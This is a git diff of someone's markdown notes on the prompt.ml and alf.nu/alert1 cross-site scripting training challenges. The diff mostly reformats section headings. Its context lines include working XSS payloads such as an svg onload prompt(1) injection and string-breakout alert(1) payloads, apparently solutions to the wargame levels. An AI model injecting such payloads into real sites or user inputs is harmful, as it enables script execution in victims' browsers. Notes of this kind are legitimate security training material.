@@ -1,6 +1,6 @@
 # prompt.ml
 
-## 1. Warm up
+### 1. Warmup
 
 - Task
  
@@ -18,7 +18,7 @@ function escape(input) {
 "><svg onload=prompt(1)> <!--
 ```
 
-## 2. Tag stripping
+### 2. Tag stripping
 
 - Task
 
@@ -39,7 +39,7 @@ function escape(input) {
 <svg onload=prompt(1) // 
 ```
 
-## 3. Parenthesis-less
+### 3. Parenthesis-less
 
 - Task
 
@@ -61,6 +61,8 @@ function escape(input) {
 
 # alf.nu/alert1
 
+### 1. Warmup
+
 -Task
 
 ```js
@@ -74,6 +76,8 @@ function escape(s) {
 ```js
 ",alert(1),"
 ```
+
+### 2. Adobe
 
 -Task
 
@@ -89,6 +93,8 @@ function escape(s) {
 ```js
 \");alert(1)//
 ```
+
+### JSON
 
 - Task
 
